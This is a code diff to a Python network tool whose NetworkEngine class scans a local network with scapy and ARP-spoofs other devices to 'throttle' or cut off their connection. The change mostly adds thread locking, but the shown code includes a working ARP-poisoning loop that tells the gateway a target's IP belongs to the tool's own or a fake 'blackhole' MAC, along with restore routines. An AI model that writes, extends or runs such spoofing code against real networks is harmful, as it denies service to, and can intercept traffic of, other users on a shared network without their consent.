@@ -14,7 +14,7 @@ import re
 import logging
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor
-from dataclasses import dataclass, field
+from dataclasses import dataclass, replace
 from typing import Optional, Callable
 
 try:
@@ -65,6 +65,7 @@ class NetworkEngine:
         self._logger = self._build_logger()
         self.devices: dict[str, NetworkDevice] = {}
         self.interface: Optional[NetworkInterface] = None
+        self._state_lock = threading.RLock()
         self._throttle_threads: dict[str, threading.Thread] = {}
         self._throttle_stop_events: dict[str, threading.Event] = {}
         self._scan_thread: Optional[threading.Thread] = None
@@ -94,6 +95,27 @@ class NetworkEngine:
             logger.addHandler(handler)
 
         return logger
+
+    def get_devices_snapshot(self) -> list[NetworkDevice]:
+        """Return a thread-safe snapshot copy of current devices."""
+        with self._state_lock:
+            return [replace(device) for device in self.devices.values()]
+
+    def get_device_snapshot(self, ip: str) -> Optional[NetworkDevice]:
+        """Return a copy of one device, if present."""
+        with self._state_lock:
+            device = self.devices.get(ip)
+            return replace(device) if device else None
+
+    def get_throttled_count(self) -> int:
+        """Return throttled device count in a thread-safe manner."""
+        with self._state_lock:
+            return sum(1 for dev in self.devices.values() if dev.is_throttled)
+
+    def get_interface_snapshot(self) -> Optional[NetworkInterface]:
+        """Return a copy of the active interface, if set."""
+        with self._state_lock:
+            return replace(self.interface) if self.interface else None
 
     def get_interfaces(self) -> list[NetworkInterface]:
         """Get all available network interfaces, matching psutil with scapy."""
@@ -200,7 +222,8 @@ class NetworkEngine:
 
     def set_interface(self, interface: NetworkInterface):
         """Set the active network interface."""
-        self.interface = interface
+        with self._state_lock:
+            self.interface = interface
 
         # Also set scapy's default interface
         if SCAPY_AVAILABLE and interface.scapy_iface:
@@ -218,7 +241,14 @@ class NetworkEngine:
 
     def scan_network(self, callback: Optional[Callable] = None, fast_mode: bool = True):
         """Scan devices on the selected network interface."""
-        if not self.interface:
+        with self._state_lock:
+            if not self.interface:
+                self._notify_status("ERROR: No interface selected!")
+                return
+            interface_ip = self.interface.ip
+            interface_mac = self.interface.mac
+
+        if not interface_ip:
             self._notify_status("ERROR: No interface selected!")
             return
 
@@ -226,21 +256,24 @@ class NetworkEngine:
             self._notify_status("Scanning network (multi-method)...")
             started_at = time.time()
             try:
-                previous_devices = list(self.devices.values())
+                with self._state_lock:
+                    previous_devices = list(self.devices.values())
                 previous_target_count = len([
                     d for d in previous_devices
                     if not d.is_self and not d.is_gateway
                 ])
-                previous_throttle_levels = {
-                    ip: self.devices[ip].throttle_level
-                    for ip in self._throttle_threads
-                    if ip in self.devices
-                }
+                with self._state_lock:
+                    previous_throttle_levels = {
+                        ip: self.devices[ip].throttle_level
+                        for ip in self._throttle_threads
+                        if ip in self.devices
+                    }
 
                 # Start each scan from a clean device list.
                 # Do NOT flush ARP cache automatically because it can reduce
                 # discovery accuracy for quiet/sleeping clients.
-                self.devices.clear()
+                with self._state_lock:
+                    self.devices.clear()
 
                 # Method 1: ARP table from Windows (most reliable)
                 self._notify_status("Step 1/3: Reading ARP table...")
@@ -255,10 +288,11 @@ class NetworkEngine:
                         self._scan_scapy_arp(timeout=4, retry=2)
 
                 # Method 3: Ping sweep fallback when quick discovery is too low
-                discovered_targets = len([
-                    d for d in self.devices.values()
-                    if not d.is_self and not d.is_gateway
-                ])
+                with self._state_lock:
+                    discovered_targets = len([
+                        d for d in self.devices.values()
+                        if not d.is_self and not d.is_gateway
+                    ])
                 self._logger.info(
                     "Scan quick pass targets=%s previous_targets=%s fast_mode=%s",
                     discovered_targets,
@@ -280,27 +314,38 @@ class NetworkEngine:
                 self._resolve_gateway_mac()
 
                 # Ensure self and gateway still exist in list even if they don't answer scan.
-                self._add_or_update_device(self.interface.ip, self.interface.mac)
-                self.devices[self.interface.ip].is_self = True
-                if self.interface.gateway_ip and self.interface.gateway_mac:
-                    self._add_or_update_device(self.interface.gateway_ip, self.interface.gateway_mac)
-                    self.devices[self.interface.gateway_ip].is_gateway = True
+                self._add_or_update_device(interface_ip, interface_mac)
+                with self._state_lock:
+                    if interface_ip in self.devices:
+                        self.devices[interface_ip].is_self = True
+                    gateway_ip = self.interface.gateway_ip if self.interface else ""
+                    gateway_mac = self.interface.gateway_mac if self.interface else ""
+                if gateway_ip and gateway_mac:
+                    self._add_or_update_device(gateway_ip, gateway_mac)
+                    with self._state_lock:
+                        if gateway_ip in self.devices:
+                            self.devices[gateway_ip].is_gateway = True
 
                 # Restore UI throttled state for active throttles.
-                for ip, level in previous_throttle_levels.items():
-                    if ip in self.devices and ip in self._throttle_threads:
-                        self.devices[ip].is_throttled = True
-                        self.devices[ip].throttle_level = level
+                with self._state_lock:
+                    for ip, level in previous_throttle_levels.items():
+                        if ip in self.devices and ip in self._throttle_threads:
+                            self.devices[ip].is_throttled = True
+                            self.devices[ip].throttle_level = level
 
                 # Stop throttle threads for stale/offline IPs.
-                active_ips = set(self.devices.keys())
-                for ip in list(self._throttle_threads.keys()):
-                    if ip not in active_ips:
-                        self._logger.info("Stopping orphan throttle for stale ip=%s", ip)
-                        self.restore_device(ip)
+                with self._state_lock:
+                    active_ips = set(self.devices.keys())
+                    stale_ips = [ip for ip in self._throttle_threads.keys() if ip not in active_ips]
+                for ip in stale_ips:
+                    self._logger.info("Stopping orphan throttle for stale ip=%s", ip)
+                    self.restore_device(ip)
 
-                device_count = len([d for d in self.devices.values()
-                                   if not d.is_self and not d.is_gateway])
+                with self._state_lock:
+                    device_count = len([
+                        d for d in self.devices.values()
+                        if not d.is_self and not d.is_gateway
+                    ])
                 elapsed = time.time() - started_at
                 self._notify_status(f"Found {device_count} devices on network ({elapsed:.1f}s)")
 
@@ -320,6 +365,11 @@ class NetworkEngine:
     def _scan_arp_table(self):
         """Read devices from Windows ARP table (arp -a)."""
         try:
+            with self._state_lock:
+                if not self.interface:
+                    return
+                subnet_prefix = '.'.join(self.interface.ip.split('.')[:3]) + '.'
+
             result = subprocess.run(
                 ["arp", "-a"],
                 capture_output=True, text=True, timeout=4,
@@ -327,8 +377,6 @@ class NetworkEngine:
             )
             if result.returncode != 0:
                 return
-
-            subnet_prefix = '.'.join(self.interface.ip.split('.')[:3]) + '.'
 
             for line in result.stdout.split('\n'):
                 line = line.strip()
@@ -411,26 +459,30 @@ class NetworkEngine:
 
     def _resolve_gateway_mac(self):
         """Resolve the gateway MAC address."""
-        if not self.interface or not self.interface.gateway_ip:
-            return
-
-        gw_ip = self.interface.gateway_ip
+        with self._state_lock:
+            if not self.interface or not self.interface.gateway_ip:
+                return
+            gw_ip = self.interface.gateway_ip
 
         # Check if gateway is already in devices
-        if gw_ip in self.devices:
-            self.interface.gateway_mac = self.devices[gw_ip].mac
-            self.devices[gw_ip].is_gateway = True
-            return
+        with self._state_lock:
+            if gw_ip in self.devices:
+                self.interface.gateway_mac = self.devices[gw_ip].mac
+                self.devices[gw_ip].is_gateway = True
+                return
 
         # Try getmacbyip
         if SCAPY_AVAILABLE:
             try:
                 gw_mac = getmacbyip(gw_ip)
                 if gw_mac:
-                    self.interface.gateway_mac = gw_mac.lower()
+                    with self._state_lock:
+                        if self.interface:
+                            self.interface.gateway_mac = gw_mac.lower()
                     self._add_or_update_device(gw_ip, gw_mac.lower())
-                    if gw_ip in self.devices:
-                        self.devices[gw_ip].is_gateway = True
+                    with self._state_lock:
+                        if gw_ip in self.devices:
+                            self.devices[gw_ip].is_gateway = True
                     return
             except Exception:
                 pass
@@ -450,38 +502,43 @@ class NetworkEngine:
                 if match and gw_ip in line:
                     mac = match.group(1).replace('-', ':').lower()
                     if mac != 'ff:ff:ff:ff:ff:ff':
-                        self.interface.gateway_mac = mac
+                        with self._state_lock:
+                            if self.interface:
+                                self.interface.gateway_mac = mac
                         self._add_or_update_device(gw_ip, mac)
-                        if gw_ip in self.devices:
-                            self.devices[gw_ip].is_gateway = True
+                        with self._state_lock:
+                            if gw_ip in self.devices:
+                                self.devices[gw_ip].is_gateway = True
                         return
         except Exception:
             pass
 
     def _add_or_update_device(self, ip: str, mac: str):
         """Add or update a device in the device list."""
-        is_gateway = (ip == self.interface.gateway_ip) if self.interface else False
-        is_self = (ip == self.interface.ip) if self.interface else False
+        with self._state_lock:
+            is_gateway = (ip == self.interface.gateway_ip) if self.interface else False
+            is_self = (ip == self.interface.ip) if self.interface else False
 
         hostname = self._hostname_cache.get(ip, "Unknown")
 
-        if ip in self.devices:
-            dev = self.devices[ip]
-            dev.mac = mac
-            if hostname != "Unknown":
-                dev.hostname = hostname
-            dev.is_gateway = is_gateway
-            dev.is_self = is_self
-            dev.last_seen = time.time()
-        else:
-            self.devices[ip] = NetworkDevice(
-                ip=ip,
-                mac=mac,
-                hostname=hostname,
-                is_gateway=is_gateway,
-                is_self=is_self,
-                last_seen=time.time()
-            )
+        with self._state_lock:
+            if ip in self.devices:
+                dev = self.devices[ip]
+                dev.mac = mac
+                if hostname != "Unknown":
+                    dev.hostname = hostname
+                dev.is_gateway = is_gateway
+                dev.is_self = is_self
+                dev.last_seen = time.time()
+            else:
+                self.devices[ip] = NetworkDevice(
+                    ip=ip,
+                    mac=mac,
+                    hostname=hostname,
+                    is_gateway=is_gateway,
+                    is_self=is_self,
+                    last_seen=time.time()
+                )
 
         if hostname == "Unknown":
             self._queue_hostname_resolution(ip)
@@ -512,15 +569,23 @@ class NetworkEngine:
             self._hostname_futures.pop(ip, None)
             self._hostname_cache[ip] = hostname
 
-        if hostname != "Unknown" and ip in self.devices:
-            self.devices[ip].hostname = hostname
-            if self.on_devices_updated:
-                self.on_devices_updated()
+        with self._state_lock:
+            if hostname != "Unknown" and ip in self.devices:
+                self.devices[ip].hostname = hostname
+                should_notify = True
+            else:
+                should_notify = False
+
+        if should_notify and self.on_devices_updated:
+            self.on_devices_updated()
 
     def _get_network_range(self) -> str:
         """Calculate the network range from interface IP and subnet mask."""
-        ip = self.interface.ip
-        mask = self.interface.subnet_mask
+        with self._state_lock:
+            if not self.interface:
+                return "0.0.0.0/24"
+            ip = self.interface.ip
+            mask = self.interface.subnet_mask
 
         ip_int = struct.unpack('!I', socket.inet_aton(ip))[0]
         mask_int = struct.unpack('!I', socket.inet_aton(mask))[0]
@@ -556,10 +621,10 @@ class NetworkEngine:
         count: int = 1
     ):
         """Send ARP is-at via L2 with explicit Ethernet destination."""
-        if not self.interface or not target_mac:
-            return
-
-        iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface
+        with self._state_lock:
+            if not self.interface or not target_mac:
+                return
+            iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface
 
         # Keep Ethernet source as NIC MAC (default) to avoid AP anti-spoof side effects.
         unicast = Ether(dst=target_mac) / ARP(
@@ -590,14 +655,24 @@ class NetworkEngine:
             self._notify_status("ERROR: Scapy not available!")
             return
 
-        if ip not in self.devices:
-            return
+        with self._state_lock:
+            device = self.devices.get(ip)
+            interface = self.interface
+            if not device:
+                return
+            if device.is_self or device.is_gateway:
+                return
+            if not interface or not interface.gateway_mac:
+                interface_ok = False
+            else:
+                interface_ok = True
+                gateway_ip = interface.gateway_ip
+                gateway_mac = interface.gateway_mac
+                target_mac = device.mac
+                iface_ip = interface.ip
+                iface_mac = interface.mac
 
-        device = self.devices[ip]
-        if device.is_self or device.is_gateway:
-            return
-
-        if not self.interface or not self.interface.gateway_mac:
+        if not interface_ok:
             self._notify_status("ERROR: Gateway MAC not found. Scan first!")
             return
 
@@ -606,26 +681,27 @@ class NetworkEngine:
         if level >= 100:
             return
 
-        device.is_throttled = True
-        device.throttle_level = level
-
         stop_event = threading.Event()
-        self._throttle_stop_events[ip] = stop_event
+        with self._state_lock:
+            current = self.devices.get(ip)
+            if not current:
+                return
+            current.is_throttled = True
+            current.throttle_level = level
+            self._throttle_stop_events[ip] = stop_event
 
         def _spoof_loop():
             self._notify_status(f"Throttling {ip} (level: {100 - level}%)")
-            gateway_ip = self.interface.gateway_ip
-            target_mac = device.mac
             self._logger.info(
                 "Throttle start ip=%s level=%s iface_ip=%s gateway_ip=%s target_mac=%s gateway_mac=%s",
                 ip,
                 level,
-                self.interface.ip if self.interface else "",
+                iface_ip,
                 gateway_ip,
                 target_mac,
-                self.interface.gateway_mac if self.interface else ""
+                gateway_mac
             )
-            spoof_hwsrc = self._blackhole_mac(ip) if level == 0 else self.interface.mac
+            spoof_hwsrc = self._blackhole_mac(ip) if level == 0 else iface_mac
 
             while not stop_event.is_set():
                 try:
@@ -642,7 +718,7 @@ class NetworkEngine:
                     # Spoofed ARP: tell gateway that target IP is at spoofed MAC
                     self._send_arp_reply(
                         target_ip=gateway_ip,
-                        target_mac=self.interface.gateway_mac,
+                        target_mac=gateway_mac,
                         claimed_ip=ip,
                         claimed_mac=spoof_hwsrc,
                         count=poison_count
@@ -663,75 +739,93 @@ class NetworkEngine:
                     stop_event.wait(2)
 
         thread = threading.Thread(target=_spoof_loop, daemon=True)
-        self._throttle_threads[ip] = thread
+        with self._state_lock:
+            self._throttle_threads[ip] = thread
         thread.start()
 
     def restore_device(self, ip: str):
         """Restore a device to normal network operation."""
-        if ip in self._throttle_stop_events:
-            self._throttle_stop_events[ip].set()
-            del self._throttle_stop_events[ip]
+        with self._state_lock:
+            stop_event = self._throttle_stop_events.pop(ip, None)
+            thread = self._throttle_threads.pop(ip, None)
 
-        if ip in self._throttle_threads:
-            thread = self._throttle_threads[ip]
+        if stop_event:
+            stop_event.set()
+
+        if thread:
             thread.join(timeout=3)
-            del self._throttle_threads[ip]
 
-        if ip in self.devices:
-            device = self.devices[ip]
+        with self._state_lock:
+            device = self.devices.get(ip)
+            interface = self.interface
+            if not device:
+                return
+            is_target = bool(interface and not device.is_self and not device.is_gateway)
+            device_mac = device.mac
 
-            if self.interface and not device.is_self and not device.is_gateway:
-                try:
-                    if not self.interface.gateway_mac:
-                        self._resolve_gateway_mac()
-                    if not self.interface.gateway_mac:
-                        self._scan_arp_table()
-                        self._resolve_gateway_mac()
+        if is_target:
+            try:
+                with self._state_lock:
+                    gateway_mac = interface.gateway_mac if interface else ""
+                if not gateway_mac:
+                    self._resolve_gateway_mac()
+                    with self._state_lock:
+                        gateway_mac = self.interface.gateway_mac if self.interface else ""
+                if not gateway_mac:
+                    self._scan_arp_table()
+                    self._resolve_gateway_mac()
+                    with self._state_lock:
+                        gateway_mac = self.interface.gateway_mac if self.interface else ""
 
-                    if self.interface.gateway_mac:
-                        # Send multiple corrective ARP bursts so recovery is faster.
-                        for _ in range(3):
-                            # Correct ARP to target (gateway IP -> gateway MAC)
-                            self._send_arp_reply(
-                                target_ip=ip,
-                                target_mac=device.mac,
-                                claimed_ip=self.interface.gateway_ip,
-                                claimed_mac=self.interface.gateway_mac,
-                                count=7
-                            )
-
-                            # Correct ARP to gateway (target IP -> target MAC)
-                            self._send_arp_reply(
-                                target_ip=self.interface.gateway_ip,
-                                target_mac=self.interface.gateway_mac,
-                                claimed_ip=ip,
-                                claimed_mac=device.mac,
-                                count=7
-                            )
-                            time.sleep(0.2)
-
-                        self._notify_status(f"Restored {ip} to normal")
-                    else:
-                        self._notify_status(
-                            f"Restore warning for {ip}: gateway MAC not found, recovery may be slower"
+                if gateway_mac and interface:
+                    # Send multiple corrective ARP bursts so recovery is faster.
+                    for _ in range(3):
+                        # Correct ARP to target (gateway IP -> gateway MAC)
+                        self._send_arp_reply(
+                            target_ip=ip,
+                            target_mac=device_mac,
+                            claimed_ip=interface.gateway_ip,
+                            claimed_mac=gateway_mac,
+                            count=7
                         )
-                except Exception as e:
-                    self._notify_status(f"Restore error for {ip}: {e}")
-                    self._logger.exception("Restore error ip=%s", ip)
 
-            device.is_throttled = False
-            device.throttle_level = 100
+                        # Correct ARP to gateway (target IP -> target MAC)
+                        self._send_arp_reply(
+                            target_ip=interface.gateway_ip,
+                            target_mac=gateway_mac,
+                            claimed_ip=ip,
+                            claimed_mac=device_mac,
+                            count=7
+                        )
+                        time.sleep(0.2)
+
+                    self._notify_status(f"Restored {ip} to normal")
+                else:
+                    self._notify_status(
+                        f"Restore warning for {ip}: gateway MAC not found, recovery may be slower"
+                    )
+            except Exception as e:
+                self._notify_status(f"Restore error for {ip}: {e}")
+                self._logger.exception("Restore error ip=%s", ip)
+
+        with self._state_lock:
+            device = self.devices.get(ip)
+            if device:
+                device.is_throttled = False
+                device.throttle_level = 100
 
     def restore_all(self):
         """Restore all throttled devices."""
-        throttled = [ip for ip, dev in self.devices.items() if dev.is_throttled]
+        with self._state_lock:
+            throttled = [ip for ip, dev in self.devices.items() if dev.is_throttled]
         for ip in throttled:
             self.restore_device(ip)
         self._notify_status("All devices restored to normal")
 
     def cleanup(self):
         """Clean up all spoofing before exit."""
-        self._running = False
+        with self._state_lock:
+            self._running = False
         self.restore_all()
         try:
             self._hostname_executor.shutdown(wait=False, cancel_futures=True)
